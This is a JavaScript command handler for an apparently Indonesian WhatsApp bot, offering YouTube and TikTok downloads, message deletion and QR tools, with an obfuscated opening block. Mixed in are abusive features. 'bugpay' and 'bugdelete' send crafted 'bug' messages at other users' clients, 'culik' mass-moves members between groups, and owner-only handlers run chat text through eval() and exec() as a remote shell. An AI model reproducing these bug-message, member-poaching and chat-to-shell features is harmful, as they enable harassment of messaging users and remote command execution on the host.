_0x3ceb16={};_0x3ceb16[_0x4b8edf(-0x16d,-0x16d,-0x14a,-0x14c)]=i+(0x94f+0xb7*-0x1f+0xcdb*0x1)+'.\x20'+fresh[i][_0x2f2bc6(0x5e,0x3f,0x2a,0x4c)],_0x3ceb16['rows']=[{'title':'[\x20🎵\x20]\x20AUDI'+'O','rowId':_0x2f2bc6(0x55,0x13,0x1c,0x37)+_0x4b8edf(-0x14a,-0x16b,-0x13c,-0x127)+fresh[i][_0x4b8edf(-0x16f,-0x152,-0x154,-0x184)],'description':'🔖Title:\x20'+fresh[i][_0x4b8edf(-0x16d,-0x184,-0x166,-0x184)]+(_0x4b8edf(-0x15a,-0x177,-0x165,-0x162)+'ption:\x20')+fresh[i][_0x4b8edf(-0x18c,-0x169,-0x188,-0x179)+'n']+(_0x2f2bc6(0x71,0x59,0x5f,0x4f)+_0x2f2bc6(0x81,0x68,0x5e,0x63))+fresh[i][_0x4b8edf(-0x161,-0x15c,-0x182,-0x169)]+(_0x4b8edf(-0x173,-0x187,-0x158,-0x191)+':\x20')+fresh[i][_0x2f2bc6(0x58,0x34,0x4d,0x4a)]+'\x0a\x0aℹ️Id\x20:\x20'+fresh[i][_0x4b8edf(-0x159,-0x16c,-0x143,-0x13d)]},{'title':_0x4b8edf(-0x149,-0x146,-0x147,-0x140)+'O','rowId':_0x2f2bc6(0x26,0x10,0x3f,0x2c)+'4\x20'+fresh[i][_0x4b8edf(-0x16f,-0x14c,-0x17d,-0x16a)],'description':'🔖Title:\x20'+fresh[i][_0x2f2bc6(0x38,0x3d,0x6e,0x4c)]+(_0x2f2bc6(0x56,0x7a,0x3c,0x5f)+'ption:\x20')+fresh[i][_0x2f2bc6(0x4a,0x3d,0x30,0x2d)+'n']+(_0x2f2bc6(0x53,0x41,0x61,0x4f)+_0x2f2bc6(0x56,0x70,0x49,0x63))+fresh[i][_0x4b8edf(-0x161,-0x151,-0x16b,-0x170)]+(_0x4b8edf(-0x173,-0x173,-0x186,-0x17d)+':\x20')+fresh[i][_0x2f2bc6(0x3b,0x5b,0x3c,0x4a)]+_0x2f2bc6(0x4c,0x1f,0x4b,0x3b)+fresh[i][_0x2f2bc6(0x44,0x70,0x4a,0x60)]}];const list=_0x3ceb16;sections[_0x2f2bc6(0x58,0x61,0x76,0x57)](list);}function _0x3038(_0x12f9ee,_0x6b987b){const _0x55152a=_0x372d();return _0x3038=function(_0x372d09,_0x30387d){_0x372d09=_0x372d09-(0x54+-0x1a90+-0x71*-0x3d);let _0x281022=_0x55152a[_0x372d09];return _0x281022;},_0x3038(_0x12f9ee,_0x6b987b);}const _0x501127={};function _0x4b8edf(_0x82e9ae,_0x3a5e79,_0x72286f,_0x324e77){return _0x3038(_0x82e9ae- -0x240,_0x3a5e79);}_0x501127[_0x4b8edf(-0x184,-0x166,-0x19a,-0x164)]='The\x20most\x20c'+_0x2f2bc6(0x6f,0x61,0x3f,0x53)+_0x4b8edf(-0x178,-0x179,-0x16e,-0x171)+_0x4b8edf(-0x14e,-0x143,-0x14d,-0x149)+_0x4b8edf(-0x174,-0x18a,-0x169,-0x15a),_0x501127[_0x2f2bc6(0x51,0x41,0x31,0x50)]=SETTING[_0x4b8edf(-0x15f,-0x144,-0x140,-0x169)],_0x501127['title']='[\x20YouTube\x20'+_0x4b8edf(-0x177,-0x179,-0x177,-0x172)+_0x2f2bc6(0x25,0x3f,0x52,0x43),_0x501127['buttonText']=_0x2f2bc6(0x2d,0x17,0x2a,0x38)+'see\x20search'+_0x4b8edf(-0x18e,-0x185,-0x1a3,-0x198);function _0x2f2bc6(_0x1f34df,_0x41bcd0,_0x1190c6,_0x15c067){return _0x3038(_0x15c067- -0x87,_0x1f34df);}_0x501127['sections']=sections;const _0x47f9d3={};_0x47f9d3[_0x2f2bc6(0x52,0x41,0x44,0x40)]=msg,await client[_0x2f2bc6(0x36,0x38,0x45,0x3c)+'e'](from,_0x501127,_0x47f9d3);
   }
  break
   case prefix+'selegigcttypgffe':{
      const sections = [
    {
	title: "Section",
      rows: [
	    {
	     title: "[ 🎵 ] MP3", 
	     rowId: `#youtubemp3 ${args[0]}|mp3`,
	    },
	    {
	     title: "[ 🎵 ] M4A", 
	     rowId: `#youtubemp3 ${args[0]}|m4a`, 
	    },
       ]        
     }    
    ]
  const listMessage = {
     text: "MP3/M4A", footer: SETTING.botname, title: "TYPE AUDIO TO SEND", buttonText: "Click!", sections
    }
    client.sendMessage(from, listMessage, {quoted:msg})
   }
  break
  //
  case prefix+'youtubemp3':{  
   if (args.length < 1) return msg.reply('linknya?')
   msg.reply('Downloading......')
   let tex = q.split("|")[0]
   let text = q.split("|")[1] || 'mp3'    
   try {
   await youtube(tex).then(async hasil => {
      const { title, mp3 } = hasil
      if (mp3 === 'undefined') return msg.reply('Link tidak dapat di akses!')   
        let bup = await getBuffer(mp3)
   	    let ranV = getRandom('.mp3')
        await fs.writeFileSync('./storage_cabinets/' + ranV, bup)
        const buff = './storage_cabinets/' + ranV    
        console.log(hasil)            
      msg.reply('Sending.....')
      
      if (text === 'm4a') {
      let aud = {
          audio: {
           url: buff
           },      
          mimetype: 'audio/mp4',
          contextInfo:{
           externalAdReply:{
             title: time,
             body: `${msg.sayingtime + msg.timoji + ' ' + msg.pushName}`,
             thumbnail: thumb,
             sourceUrl: "https://instagram.com/rifza.p.p",
             mediaUrl: "https://instagram.com/rifza.p.p",
             //renderLargerThumbnail: true,
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
        client.sendMessage(from, aud, { quoted : msg.fkontak })
       } else if (text === 'mp3') {
         let aud = {
          document: {
           url: buff

           },      
          fileName: `${title + '.mp3'}`,
          mimetype: 'audio/mp3',
          contextInfo:{
           externalAdReply:{
             title: time,
             body: `${msg.sayingtime + msg.timoji + ' ' + msg.pushName}`,
             thumbnail: thumb,
             sourceUrl: "https://instagram.com/rifza.p.p",
             mediaUrl: "https://instagram.com/rifza.p.p",
             //renderLargerThumbnail: true,
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
         client.sendMessage(from, aud, { quoted : msg.fkontak })
        } else { msg.reply('Undefined!') }
         setTimeout(() => { fs.unlinkSync(buff) }, 10000) 
     })
     } catch (e){
    msg.reply(`Akses ditolak, tidak dapat mengunduh!. Cobalah menggunakan link yang lain\n\nType err :\n${e}`)
   }
   
   }
  break

  //
  case prefix+'youtubemp4':{
  if (args.length < 1) return msg.reply('linknya?')
  msg.reply('Downloading......')
   try{
           let nuh = await youtube(q)
      const { title, link } = nuh
      console.log(nuh)
      await getBuffer(link)
      .then(async result => {
   	    let ranV = getRandom('.mp4')
        await fs.writeFileSync('./storage_cabinets/' + ranV, result)
        const buff = './storage_cabinets/' + ranV    
        console.log(result)                

     if (link === 'undefined') return msg.reply('Link tidak dapat di akses!')
     msg.reply('Sending.....') 
         let vid = {
          video: {
           url: buff
           }, 
          caption:"*Done✔️*\n" + '```' + title + '```',     
          contextInfo:{
           externalAdReply:{
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
        client.sendMessage(from, vid, { quoted : msg.fkontak })
       setTimeout(() => { fs.unlinkSync(buff) }, 10000)

       })
      } catch (e){
    msg.reply(`Akses ditolak, tidak dapat mengunduh!. Cobalah menggunakan link yang lain\n\nType err :\n${e}`)
   }  }
   break
   case prefix+'tiktok': 
   case prefix+'tiktokdl': 
   case prefix+'tiktokvideo': 
   case prefix+'tiktokdownload': 
   case prefix+'tiktoknowm':{
   if (args.length < 1) return msg.reply('linknya?') 
   msg.reply('Downloading.....')
    try{
	 await TiktokDownloader(args[0])
 	 .then(async hasil => {
	
	  var { media } = hasil
	  console.log(hasil)	  
	    msg.reply('Sending.....') 
         let vid = {
          video: {
           url: media[1].url
           }, 
          caption: hasil.title,     
          contextInfo:{
           externalAdReply:{
             title: time,
             body: `${msg.sayingtime + msg.timoji + ' ' + msg.pushName}`,
             thumbnail: thumb,
             sourceUrl: "https://instagram.com/rifza.p.p",
             mediaUrl: "https://instagram.com/rifza.p.p",
             //renderLargerThumbnail: true,
             showAdAttribution: true,
             mediaType: 1
            }
           }
         }
        client.sendMessage(from, vid, { quoted : msg.fkontak })
    })
          } catch (e){
    msg.reply(`Akses ditolak, tidak dapat mengunduh!. Cobalah menggunakan link yang lain\n\nType err :\n${e}`)
    }  
   }
   break
   case prefix+'bugpay': case prefix+'bugpayement':{
   if(!isOwner && !msg.key.fromMe) return   
    let requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": msg.kon}}}), { userJid: msg.kon })
    client.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
    }
   break
   
   case prefix+'delltoal': case prefix+'dellforall': case prefix+'deltoal': case prefix+'delforall':{
      if (!isGroup) return msg.reply('Khusus Grup')
      if (!isGroupAdmins) return msg.reply('Khusus Admin')
      if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')         
      if (!msg.quoted) return msg.reply('Reply pesanya!')
      let toDel = msg.message.extendedTextMessage.contextInfo.participant
      let idMsg = msg.message.extendedTextMessage.contextInfo.stanzaId
       client.deleteAll(idMsg, toDel)
    }
   break
  //
   case prefix+'bugdelete': case prefix+'bugdelet': case prefix+'bugdel': case prefix+'delbug':{//copyright rfz-xilvermoods
      if (!isGroup) return msg.reply('Khusus Grup')
      if (!isGroupAdmins) return msg.reply('Khusus Admin')
      if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')         
      if (!msg.quoted) return  msg.reply('Reply pesanya!')
        let toDel = msg.message.extendedTextMessage.contextInfo.participant
        let idMsg = msg.message.extendedTextMessage.contextInfo.stanzaId
        client.sendBugDelete(toDel, idMsg)
          .catch((err) => {
         console.log(err)
         msg.reply('Error!')
       })
     }
    break
   //
    case prefix+'hapus': case prefix+'delete': case prefix+'del': case prefix+'d':{
      if (!msg.quoted) return  msg.reply('Reply pesanya!')
       if (!msg.quoted.isBaileys) return  msg.reply('Fitur ini hanya berlaku menghapus pesan bot yang di kirim oleh saya!')
         
       client.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: msg.quoted.id, participant: msg.quoted.sender } })
         }
      break
  //
  case prefix+'toqr': case prefix+'jadiqr':{
  if (!q) return msg.reply(' Harap sertakan teks/link!')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await client.sendMessage(from, { image: medi, caption:"Success✓!"}, { quoted: msg })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break

   

  case prefix+'c': case prefix+'culik':{
  if(!isOwner) return msg.reply('Khusus owner!!!!')  
  let text1 = q.split("|")[0]
  let text2 = q.split("|")[1]
  if(!text1) return msg.reply(`Example:\n${order +' 1234567890@g.us|_amount_'}`)
  if(!text2) return msg.reply(`Example:\n${order +' 1234567890@g.us|_amount_'}`)
  client.sendMessage(text1, { text: `Permintaan penculikan member oleh @${msg.sender.split("@")[0]}\nJumlah: ${text2}\nMengimpor dari : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })               
  await client.sendMessage(from, { text: `Permintaan penculikan member oleh @${msg.sender.split("@")[0]}\nJumlah: ${text2}\nMengimpor dari : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })                
  await msg.sequestrar(text1, groupMembers.map(mem => mem.id), text2)
  }
  break

  break
  case prefix+'tinyurl':{
   if(!q) return msg.reply('link?')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  msg.reply(body)
  } catch (e) {
  msg.reply(e)
  }
  })
  }
 break
 //
  default:


   //=======================================================//
                      /* { includes } */   
   //=======================================================//
  
  if (chatmessage.includes(`assalamualaikum`) || chatmessage.includes(`Asalamu'alaikum`) || chatmessage.includes(`Assalamualaikum`) || chatmessage.includes(`Asalamualaikum`) || chatmessage.includes(`asalamu'alaikum`) || chatmessage.includes(`assalamu'alaikum`) || chatmessage.includes(`Assalamu'alaikum`) || chatmessage.includes(`Assalamu'alaikum`) || chatmessage.includes(`asalamualaikum`) || chatmessage.includes(`asalamu'alaikum`)) {
       
        client.sendMessage(from, 
        { text: 'Waalaikumsalam' }, 
        { quoted : msg })  

       }    
    if (chatmessage.includes(`kontol`) || chatmessage.includes(`Kontol`)){
       client.sendMessage(from, 
        { text: '🗿' }, 
        { quoted : msg })  

       }
       
  
       if (chatmessage.startsWith('=>')) {
        if (!isOwner) return 
         function Return(sul) {
         sat = JSON.stringify(sul, null, 2)
         bang = util.format(sat)
         if (sat == undefined) {
            bang = util.format(sul)
          }
          return msg.reply(bang)
         }
        try {
         msg.reply(util.format(eval(`(async () => { ${chatmessage.slice(3)} })()`)))
        } catch (e) {
         msg.reply(String(e))
        }
          }
       
      if (chatmessage.startsWith('>')) {
       if (!isOwner) return 
        try {
          let evaled = await eval(chatmessage.slice(2))
           if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
           await msg.reply(evaled)
         } catch (err) {
           msg.reply(String(err))
        }
       }

     if (chatmessage.startsWith('$')) {
       if (!isOwner) return 
        exec(chatmessage.slice(2), (err, stdout) => {
       if(err) return client.sendMessage(from, {text :String(err)}, {quoted:msg})
       if (stdout) return msg.reply(stdout)
       })
     } 
  

//ini belum ada fungsinya bg  
if (fs.existsSync('./' + msg.sender + '.json')){
   if (msg.key.fromMe) return
      chet = chatmessage//budy biasanya kalo di sc lain
     let rfz = JSON.parse(fs.readFileSync("./" + msg.sender + ".json"))

     if(!rfz.depo == true){
        if (!isNaN(chet)){
          msg.reply(`deposit anda adalah ${chatmessage}\n ketik Y untuk menyetujui!`)
          fs.writeFileSync("./" + msg.sender + ".json", JSON.stringify({ depo: true }, null, 2))       
       } else { msg.reply('Harus berup angka!')}
     }

    if(chatmessage == 'Y'){
      if(rfz.depo == true){
        fs.unlinkSync("./" + msg.sender + ".json");
        msg.reply('done')
      }
  }
}

 if (chatmessage.includes(`halllo`)){
       client.sendMessage(from, 
        { text: 'Halo juga kak :)' }, 
        { quoted : msg })  

       } 
     

 }

}//end module exports
let file = require.resolve(__filename)
 fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.red(`New ${__filename}`))
	delete require.cache[file]
	require(file)
})

//